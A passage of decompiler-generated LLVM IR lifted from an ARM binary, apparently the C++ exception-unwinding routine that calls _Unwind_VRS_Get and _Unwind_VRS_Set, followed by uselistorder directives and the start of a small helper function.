  br i1 %v3_313f4, label %dec_label_pc_31404, label %dec_label_pc_31538

dec_label_pc_31404:                               ; preds = %bb159
  %v1_31404 = add i32 %v0_313d4, 4
  store i32 %v1_31404, i32* @r6, align 4
  store i32 112, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_31414 = load i32, i32* @r8, align 4
  %v1_31414 = add i32 %v0_31414, 88
  store i32 %v1_31414, i32* %sb.global-to-local, align 4
  store i32 %v1_31404, i32* @r4, align 4
  br label %dec_label_pc_31438

dec_label_pc_31428:                               ; preds = %bb161
  %v1_31428 = add i32 %v0_31428, 1
  store i32 %v1_31428, i32* @r5, align 4
  %v1_3142c = load i32, i32* @sl, align 4
  %v9_3142c = icmp eq i32 %v1_31428, %v1_3142c
  %v0_31430 = load i32, i32* @r4, align 4
  %v1_31430 = add i32 %v0_31430, 4
  store i32 %v1_31430, i32* @r4, align 4
  br i1 %v9_3142c, label %dec_label_pc_31660, label %dec_label_pc_31428.dec_label_pc_31438_crit_edge

dec_label_pc_31428.dec_label_pc_31438_crit_edge:  ; preds = %dec_label_pc_31428
  %v0_31444.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_31438

dec_label_pc_31438:                               ; preds = %dec_label_pc_31428.dec_label_pc_31438_crit_edge, %dec_label_pc_31404
  %v0_31444 = phi i32 [ %v0_31444.pre, %dec_label_pc_31428.dec_label_pc_31438_crit_edge ], [ %v1_31414, %dec_label_pc_31404 ]
  %v1_31448 = phi i32 [ %v1_31430, %dec_label_pc_31428.dec_label_pc_31438_crit_edge ], [ %v1_31404, %dec_label_pc_31404 ]
  %v1_31438 = inttoptr i32 %v1_31448 to i32*
  %v2_31438 = load i32, i32* %v1_31438, align 4
  %v2_3143c = icmp eq i32 %v2_31438, 0
  store i32 %v0_31444, i32* %forced_unwind_-44, align 4
  br i1 %v2_3143c, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_31438
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_31438, %bb160
  %v0_3144c = load i32, i32* @r8, align 4
  store i32 %v0_3144c, i32* %r0.global-to-local, align 4
  store i32 %v2_314d8, i32* %r2.global-to-local, align 4
  %v4_3145c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 112) to i32*), align 4
  store i32 201832, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_3145c)
  %v0_31468 = load i32, i32* %r0.global-to-local, align 4
  %v2_31468 = icmp eq i32 %v0_31468, 0
  %v0_31428 = load i32, i32* @r5, align 4
  br i1 %v2_31468, label %dec_label_pc_31428, label %dec_label_pc_31470

dec_label_pc_31470:                               ; preds = %bb161
  %v1_31470 = load i32, i32* @sl, align 4
  %v9_31470 = icmp eq i32 %v0_31428, %v1_31470
  br i1 %v9_31470, label %dec_label_pc_31660, label %dec_label_pc_31478

dec_label_pc_31478:                               ; preds = %dec_label_pc_31470
  %v0_31478 = load i32, i32* @r7, align 4
  %v1_31478 = inttoptr i32 %v0_31478 to i32*
  %v2_31478 = load i32, i32* %v1_31478, align 4
  %v1_3147c = icmp slt i32 %v2_31478, 0
  %v0_31484.pre = load i32, i32* @r6, align 4
  br i1 %v1_3147c, label %dec_label_pc_31484, label %dec_label_pc_31544

dec_label_pc_31484:                               ; preds = %dec_label_pc_31478, %dec_label_pc_3153c
  %v0_31484 = phi i32 [ %storemerge, %dec_label_pc_3153c ], [ %v0_31484.pre, %dec_label_pc_31478 ]
  store i32 %v0_31484, i32* %r0.global-to-local, align 4
  %v1_31488 = add i32 %v0_31484, 4
  store i32 %v1_31488, i32* @r6, align 4
  br label %dec_label_pc_31544

dec_label_pc_31490:                               ; preds = %bb154
  store i32 %v1_31210, i32* %r2.global-to-local, align 4
  br i1 %v2_3130c, label %dec_label_pc_3149c, label %dec_label_pc_31588

dec_label_pc_3149c:                               ; preds = %dec_label_pc_31490
  %v2_3149c = icmp eq i32 %v0_3149c, 0
  br i1 %v2_3149c, label %dec_label_pc_31508, label %dec_label_pc_314a4

dec_label_pc_314a4:                               ; preds = %dec_label_pc_3149c
  %v0_314a4 = load i32, i32* @r7, align 4
  %v1_314a4 = add i32 %v0_314a4, 4
  %v2_314a4 = inttoptr i32 %v1_314a4 to i32*
  %v3_314a4 = load i32, i32* %v2_314a4, align 4
  %v7_314a8 = icmp eq i32 %v3_314a4, -2
  store i32 %v1_314a4, i32* %r2.global-to-local, align 4
  br i1 %v7_314a8, label %dec_label_pc_313c0, label %dec_label_pc_314b4

dec_label_pc_314b4:                               ; preds = %dec_label_pc_314a4
  %v0_314b4 = load i32, i32* @r8, align 4
  %v1_314b4 = add i32 %v0_314b4, 88
  %v7_314b8 = icmp eq i32 %v3_314a4, -1
  store i32 %v1_314b4, i32* %forced_unwind_-44, align 4
  br i1 %v7_314b8, label %dec_label_pc_314fc, label %dec_label_pc_314c4

dec_label_pc_314c4:                               ; preds = %dec_label_pc_314b4
  %v2_314c8 = icmp eq i32 %v3_314a4, 0
  br i1 %v2_314c8, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_314c4
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_314c4, %bb162
  store i32 %v0_314b4, i32* %r0.global-to-local, align 4
  store i32 %v2_314d8, i32* %r2.global-to-local, align 4
  %v4_314e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 112) to i32*), align 4
  store i32 201968, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_314e4)
  %v0_314f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_314f0 = icmp eq i32 %v0_314f0, 0
  br i1 %v2_314f0, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_314fc.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_314fc

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_31508

dec_label_pc_314fc:                               ; preds = %.thread25, %dec_label_pc_314b4
  %v3_314fc = phi i32 [ %v3_314fc.pr, %.thread25 ], [ %v1_314b4, %dec_label_pc_314b4 ]
  %v2_31500 = icmp eq i32 %v3_314fc, 0
  br i1 %v2_31500, label %dec_label_pc_31508, label %dec_label_pc_31660

dec_label_pc_31508:                               ; preds = %bb164, %dec_label_pc_315b4, %dec_label_pc_31588, %dec_label_pc_314fc, %dec_label_pc_3149c
  %v0_31508 = load i32, i32* @r7, align 4
  %v1_31508 = add i32 %v0_31508, 8
  %v1_31270 = inttoptr i32 %v1_31508 to i32*
  %v2_31270 = load i32, i32* %v1_31270, align 4
  %v2_31274 = icmp eq i32 %v2_31270, 0
  br i1 %v2_31274, label %dec_label_pc_31330, label %dec_label_pc_3127c.preheader

dec_label_pc_31510:                               ; preds = %entry
  %v3_31510 = udiv i32 %v2_31204, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_31520 = mul nuw nsw i32 %v3_31510, 4
  %v3_31524 = mul i32 %v2_31204, 65536
  %v2_31528 = add i32 %v6_31520, %v4_31204
  store i32 %v3_31524, i32* %v4_31224, align 8
  br label %dec_label_pc_3124c

dec_label_pc_31538:                               ; preds = %bb159, %dec_label_pc_313e4
  %v1_31538 = add i32 %v0_313d4, 4
  br label %dec_label_pc_3153c

dec_label_pc_3153c:                               ; preds = %dec_label_pc_3157c, %dec_label_pc_31538
  %v0_3153c = phi i32 [ %v2_3157c, %dec_label_pc_3157c ], [ %v2_313d4, %dec_label_pc_31538 ]
  %storemerge = phi i32 [ %v4_3157c, %dec_label_pc_3157c ], [ %v1_31538, %dec_label_pc_31538 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_3153c = icmp slt i32 %v0_3153c, 0
  br i1 %v1_3153c, label %dec_label_pc_31484, label %dec_label_pc_31544

dec_label_pc_31544:                               ; preds = %dec_label_pc_31478, %dec_label_pc_3153c, %dec_label_pc_31650, %dec_label_pc_31484
  %v0_31548 = phi i32 [ %v1_31488, %dec_label_pc_31484 ], [ %storemerge, %dec_label_pc_3153c ], [ %v1_31654, %dec_label_pc_31650 ], [ %v0_31484.pre, %dec_label_pc_31478 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_31484 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_3153c ], [ %v1_31650, %dec_label_pc_31650 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_31478 ]
  %v0_31544 = load i32, i32* @sl, align 4
  %v3_31544 = mul i32 %v0_31544, 4
  %v2_31548 = add i32 %v3_31544, %v0_31548
  %v1_3127065 = inttoptr i32 %v2_31548 to i32*
  %v2_3127066 = load i32, i32* %v1_3127065, align 4
  %v2_3127468 = icmp eq i32 %v2_3127066, 0
  br i1 %v2_3127468, label %dec_label_pc_31330, label %dec_label_pc_3127c.preheader.lr.ph

dec_label_pc_31550:                               ; preds = %dec_label_pc_313d0
  %v0_31560 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_31560, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_31568 = load i32, i32* @r8, align 4
  %v1_31568 = add i32 %v0_31568, 32
  %v2_31568 = inttoptr i32 %v1_31568 to i32*
  %v3_31568 = load i32, i32* %v2_31568, align 4
  store i32 %v3_31568, i32* @r4, align 4
  %v5_3156c = call i32 @_Unwind_VRS_Get(i32 %v0_31560, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_3156c, i32* %r0.global-to-local, align 4
  %v3_31570 = load i32, i32* %stack_var_-48, align 4
  %v0_31574 = load i32, i32* @r4, align 4
  %v9_31574 = icmp eq i32 %v0_31574, %v3_31570
  br i1 %v9_31574, label %dec_label_pc_3161c, label %dec_label_pc_31550.dec_label_pc_3157c_crit_edge

dec_label_pc_31550.dec_label_pc_3157c_crit_edge:  ; preds = %dec_label_pc_31550
  %v0_3157c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_3157c

dec_label_pc_3157c:                               ; preds = %dec_label_pc_31550.dec_label_pc_3157c_crit_edge, %dec_label_pc_3161c
  %v0_3157c = phi i32 [ %v0_3157c.pre, %dec_label_pc_31550.dec_label_pc_3157c_crit_edge ], [ %v1_31620, %dec_label_pc_3161c ]
  %v1_3157c = inttoptr i32 %v0_3157c to i32*
  %v2_3157c = load i32, i32* %v1_3157c, align 4
  %v4_3157c = add i32 %v0_3157c, 4
  store i32 %v4_3157c, i32* @r7, align 4
  br label %dec_label_pc_3153c

dec_label_pc_31588:                               ; preds = %dec_label_pc_31490
  %v0_31598 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_31598, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_315a0 = load i32, i32* @r8, align 4
  %v1_315a0 = add i32 %v0_315a0, 32
  %v2_315a0 = inttoptr i32 %v1_315a0 to i32*
  %v3_315a0 = load i32, i32* %v2_315a0, align 4
  store i32 %v3_315a0, i32* @r4, align 4
  %v5_315a4 = call i32 @_Unwind_VRS_Get(i32 %v0_31598, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_315a4, i32* %r0.global-to-local, align 4
  %v3_315a8 = load i32, i32* %stack_var_-48, align 4
  %v0_315ac = load i32, i32* @r4, align 4
  %v9_315ac = icmp eq i32 %v0_315ac, %v3_315a8
  br i1 %v9_315ac, label %dec_label_pc_315b4, label %dec_label_pc_31508

dec_label_pc_315b4:                               ; preds = %dec_label_pc_31588
  %v0_315b4 = load i32, i32* @r8, align 4
  %v1_315b4 = add i32 %v0_315b4, 40
  %v2_315b4 = inttoptr i32 %v1_315b4 to i32*
  %v3_315b4 = load i32, i32* %v2_315b4, align 4
  %v1_315b8 = load i32, i32* @r7, align 4
  %v9_315b8 = icmp eq i32 %v3_315b4, %v1_315b8
  br i1 %v9_315b8, label %dec_label_pc_315c0, label %dec_label_pc_31508

dec_label_pc_315c0:                               ; preds = %dec_label_pc_315b4
  %v1_315c0 = inttoptr i32 %v3_315b4 to i32*
  %v2_315c0 = load i32, i32* %v1_315c0, align 4
  %v1_315c4 = and i32 %v2_315c0, 1073741824
  %v2_315c4 = icmp eq i32 %v1_315c4, 0
  br i1 %v2_315c4, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_315c0
  %v2_315c8 = or i32 %v2_315c0, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_315c0
  %tmp208 = bitcast i32 %v2_315c0 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_315cc = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_315d0 = phi i32 [ %v2_31700, %.thread28 ], [ %v2_31700, %bb169 ], [ %v3_315b4, %bb165 ], [ %v3_315b4, %.thread26 ]
  %v0_315d0 = phi i32 [ %v2_31710, %.thread28 ], [ %v2_3170c, %bb169 ], [ %v2_315c8, %bb165 ], [ %v2_315cc, %.thread26 ]
  %v2_315d0 = add i32 %v0_315d0, %v1_315d0
  store i32 %v2_315d0, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_315e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_315e8, i32* %r0.global-to-local, align 4
  %v5_315f0 = call i32 @_Unwind_VRS_Set(i32 %v0_315e8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_315e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_31608 = load i32, i32* @r8, align 4
  store i32 %v0_31608, i32* %stack_var_-48, align 4
  %v5_31610 = call i32 @_Unwind_VRS_Set(i32 %v0_315e8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_313c4

dec_label_pc_3161c:                               ; preds = %dec_label_pc_31550
  %v0_3161c = load i32, i32* @r8, align 4
  %v1_3161c = add i32 %v0_3161c, 40
  %v2_3161c = inttoptr i32 %v1_3161c to i32*
  %v3_3161c = load i32, i32* %v2_3161c, align 4
  %v1_31620 = load i32, i32* @r7, align 4
  %v9_31620 = icmp eq i32 %v3_3161c, %v1_31620
  br i1 %v9_31620, label %dec_label_pc_31628, label %dec_label_pc_3157c

dec_label_pc_31628:                               ; preds = %dec_label_pc_3161c
  %v1_3162c = add i32 %v3_3161c, 4
  store i32 %v1_3162c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_31634 = add i32 %v0_3161c, 44
  %v3_31634 = inttoptr i32 %v2_31634 to i32*
  store i32 0, i32* %v3_31634, align 4
  %v0_31638 = load i32, i32* %r2.global-to-local, align 4
  %v1_31638 = load i32, i32* @r8, align 4
  %v2_31638 = add i32 %v1_31638, 48
  %v3_31638 = inttoptr i32 %v2_31638 to i32*
  store i32 %v0_31638, i32* %v3_31638, align 4
  %v0_3163c = load i32, i32* @sl, align 4
  %v1_3163c = load i32, i32* @r8, align 4
  %v2_3163c = add i32 %v1_3163c, 40
  %v3_3163c = inttoptr i32 %v2_3163c to i32*
  store i32 %v0_3163c, i32* %v3_3163c, align 4
  %v0_31640 = load i32, i32* %r0.global-to-local, align 4
  %v1_31640 = load i32, i32* @r8, align 4
  %v2_31640 = add i32 %v1_31640, 52
  %v3_31640 = inttoptr i32 %v2_31640 to i32*
  store i32 %v0_31640, i32* %v3_31640, align 4
  %v0_31644 = load i32, i32* @r7, align 4
  %v1_31644 = inttoptr i32 %v0_31644 to i32*
  %v2_31644 = load i32, i32* %v1_31644, align 4
  %v1_31648 = icmp slt i32 %v2_31644, 0
  br i1 %v1_31648, label %dec_label_pc_31650, label %dec_label_pc_316fc

dec_label_pc_31650:                               ; preds = %dec_label_pc_31628
  %v0_31650 = load i32, i32* %r2.global-to-local, align 4
  %v1_31650 = add i32 %v0_31650, -3
  store i32 %v1_31650, i32* %r2.global-to-local, align 4
  %v0_31654 = load i32, i32* %r0.global-to-local, align 4
  %v1_31654 = add i32 %v0_31654, 4
  store i32 %v1_31654, i32* @r6, align 4
  br label %dec_label_pc_31544

dec_label_pc_31660:                               ; preds = %dec_label_pc_31470, %dec_label_pc_314fc, %dec_label_pc_31428, %dec_label_pc_313fc.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_31670 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_31670, i32* %r0.global-to-local, align 4
  %v5_31678 = call i32 @_Unwind_VRS_Get(i32 %v0_31670, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_3167c = load i32, i32* @r7, align 4
  %v1_3167c = load i32, i32* @r8, align 4
  %v2_3167c = add i32 %v1_3167c, 40
  %v3_3167c = inttoptr i32 %v2_3167c to i32*
  store i32 %v0_3167c, i32* %v3_3167c, align 4
  %v3_31680 = load i32, i32* %stack_var_-48, align 4
  %v3_31684 = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_31684, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_3168c = load i32, i32* @r8, align 4
  %v2_3168c = add i32 %v1_3168c, 32
  %v3_3168c = inttoptr i32 %v2_3168c to i32*
  store i32 %v3_31680, i32* %v3_3168c, align 4
  %v0_31690 = load i32, i32* %r2.global-to-local, align 4
  %v1_31690 = load i32, i32* @r8, align 4
  %v2_31690 = add i32 %v1_31690, 36
  %v3_31690 = inttoptr i32 %v2_31690 to i32*
  store i32 %v0_31690, i32* %v3_31690, align 4
  %v1_313cc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_313c4

dec_label_pc_31698:                               ; preds = %bb155
  %v1_31698 = inttoptr i32 %v0_31320 to i32*
  %v2_31698 = load i32, i32* %v1_31698, align 4
  %v1_3169c = add i32 %v0_31320, 4
  %v1_316a0 = and i32 %v2_31698, 1073741824
  %v2_316a0 = icmp eq i32 %v1_316a0, 0
  %v2_316a4 = or i32 %v2_31698, -2147483648
  %tmp210 = bitcast i32 %v2_31698 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_316a8 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_316a0, i32 %v2_316a8, i32 %v2_316a4
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_316ac = load i32, i32* @r8, align 4
  %v2_316ac = add i32 %v1_316ac, 56
  %v3_316ac = inttoptr i32 %v2_316ac to i32*
  store i32 %v1_3169c, i32* %v3_316ac, align 4
  %v0_316b0 = load i32, i32* @r8, align 4
  store i32 %v0_316b0, i32* %r0.global-to-local, align 4
  %v4_316bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 36) to i32*), align 4
  store i32 202440, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_316bc)
  %v0_316c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_316c8 = icmp eq i32 %v0_316c8, 0
  br i1 %v2_316c8, label %dec_label_pc_313c0, label %dec_label_pc_316d0

dec_label_pc_316d0:                               ; preds = %dec_label_pc_31698
  %v0_316d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_316d0 = load i32, i32* @r7, align 4
  %v2_316d0 = add i32 %v1_316d0, %v0_316d0
  store i32 %v2_316d0, i32* %stack_var_-48, align 4
  %v0_316e0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_316e0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_316f0 = call i32 @_Unwind_VRS_Set(i32 %v0_316e0, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_313c4

dec_label_pc_316fc:                               ; preds = %dec_label_pc_31628
  %v0_316fc = load i32, i32* @sl, align 4
  %v3_316fc = mul i32 %v0_316fc, 4
  %v0_31700 = load i32, i32* %r0.global-to-local, align 4
  %v2_31700 = add i32 %v0_31700, %v3_316fc
  %v3_31700 = inttoptr i32 %v2_31700 to i32*
  %v4_31700 = load i32, i32* %v3_31700, align 4
  %v1_31704 = and i32 %v4_31700, 1073741824
  %v2_31704 = icmp eq i32 %v1_31704, 0
  br i1 %v2_31704, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_316fc
  %v2_3170c = or i32 %v4_31700, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_316fc
  %tmp212 = bitcast i32 %v4_31700 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_31710 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_31700, { 2, 1, 0 }
  uselistorder i32 %v1_31654, { 1, 0 }
  uselistorder i32 %v1_31650, { 1, 0 }
  uselistorder i32 %v1_31620, { 1, 0 }
  uselistorder i32 %v0_315e8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_315b4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_3157c, { 1, 0 }
  uselistorder i32 %v0_3157c, { 1, 0 }
  uselistorder i32 %v2_3127066, { 1, 0 }
  uselistorder i32 %v2_31548, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_31270, { 1, 0 }
  uselistorder i32 %v1_31508, { 1, 0 }
  uselistorder i32 %v3_314a4, { 2, 0, 1 }
  uselistorder i32 %v0_31484, { 1, 0 }
  uselistorder i32 %v0_31484.pre, { 1, 0 }
  uselistorder i32 %v1_313dc, { 1, 0 }
  uselistorder i32 %v2_313d4, { 1, 0 }
  uselistorder i32 %v0_31364, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_31324, { 1, 0 }
  uselistorder i32 %v1_31320, { 1, 0 }
  uselistorder i32 %v0_31320, { 1, 0, 2 }
  uselistorder i32 %v4_312f8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_3149c, { 1, 2, 0 }
  uselistorder i32 %v0_312d0, { 1, 0 }
  uselistorder i32 %v3_312cc, { 1, 0, 2 }
  uselistorder i32 %v1_312a0, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_314d8, { 1, 0 }
  uselistorder i1 %v2_3130c, { 1, 0, 2 }
  uselistorder i32 %v1_31210, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 34, 0, 5, 26, 27, 4, 21, 22, 28, 29, 30, 31, 6, 7, 33, 3, 1, 8, 32, 2, 9, 10, 11, 12, 13, 14, 23, 15, 16, 18, 19, 20, 17, 24, 25 }
  uselistorder i32 -3, { 2, 3, 0, 1, 4, 6, 5 }
  uselistorder i32 52, { 40, 2, 1, 6, 8, 33, 29, 24, 9, 10, 11, 31, 27, 32, 30, 28, 12, 13, 3, 14, 15, 16, 17, 4, 18, 19, 20, 35, 36, 5, 37, 0, 7, 23, 38, 39, 21, 22, 34, 25, 26 }
  uselistorder i32 48, { 36, 6, 7, 26, 1, 17, 8, 22, 23, 18, 19, 2, 25, 27, 9, 28, 29, 3, 10, 30, 11, 31, 24, 12, 13, 14, 4, 0, 33, 34, 35, 32, 20, 21, 15, 16, 5 }
  uselistorder i32 44, { 38, 11, 12, 17, 18, 13, 2, 39, 40, 1, 3, 14, 15, 0, 16, 4, 22, 23, 24, 25, 26, 27, 19, 20, 21, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 -2147483648, { 24, 25, 26, 27, 28, 29, 30, 31, 2, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 6, 7, 18, 19, 5, 0, 1, 4, 20, 21, 22, 23 }
  uselistorder i32 1073741824, { 8, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 65536, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 12, 11, 17, 13, 18, 14, 19, 15, 20, 16, 21, 22, 23, 27, 24, 28, 25, 29, 26, 30, 32, 31, 33, 76, 74, 75, 73, 77, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 48, 49, 50, 51, 53, 52, 54, 57, 56, 55, 58, 59, 60, 63, 62, 61, 64, 66, 67, 65, 68, 70, 71, 69, 72 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 112) to i32*), { 1, 0 }
  uselistorder i32 88, { 20, 21, 18, 2, 19, 15, 16, 0, 3, 5, 4, 6, 1, 7, 8, 9, 10, 11, 13, 12, 14, 17 }
  uselistorder i32 112, { 0, 3, 4, 7, 1, 8, 5, 2, 9, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_428d0.3044 to i32), { 49, 8, 50, 51, 9, 10, 93, 126, 127, 94, 95, 96, 128, 11, 12, 97, 129, 2, 130, 131, 132, 133, 134, 135, 136, 3, 4, 0, 5, 98, 99, 137, 13, 100, 138, 14, 15, 16, 17, 18, 61, 60, 62, 139, 140, 48, 101, 141, 102, 142, 23, 25, 20, 21, 24, 19, 22, 143, 144, 145, 63, 26, 146, 147, 148, 27, 103, 149, 150, 28, 104, 151, 152, 29, 30, 31, 153, 105, 154, 32, 155, 33, 156, 157, 158, 106, 159, 34, 160, 6, 107, 161, 108, 162, 163, 109, 164, 165, 166, 35, 36, 111, 167, 168, 169, 170, 171, 172, 52, 87, 83, 81, 80, 82, 84, 85, 86, 79, 88, 74, 76, 75, 73, 72, 77, 78, 69, 68, 71, 70, 67, 66, 65, 64, 113, 89, 112, 90, 53, 91, 110, 114, 173, 7, 115, 116, 174, 117, 38, 37, 175, 39, 40, 118, 41, 42, 176, 43, 177, 120, 119, 59, 56, 57, 58, 55, 44, 92, 54, 45, 46, 121, 122, 123, 178, 47, 179, 1, 124, 125 }
  uselistorder i32 -2, { 0, 27, 28, 10, 11, 12, 13, 21, 3, 5, 6, 4, 14, 15, 16, 1, 7, 9, 8, 17, 23, 24, 25, 26, 19, 18, 22, 20, 2 }
  uselistorder i32 80, { 8, 9, 10, 0, 4, 1, 2, 5, 6, 7, 3 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_31660, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_3157c, { 1, 0 }
  uselistorder label %dec_label_pc_31544, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_31508, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_31484, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_313c4, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_313c0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_31320, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_3127c, { 1, 0 }
  uselistorder label %dec_label_pc_3127c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_3127c.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_3171c(i32 %arg1) local_unnamed_addr {
dec_label_pc_3171c:
  %v0_3171c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_3171c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_3171c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_3171c, %bb
  %v4_31724 = phi i32 [ %arg1, %dec_label_pc_3171c ], [ 0, %bb ]
  ret i32 %v4_31724

; uselistorder directives
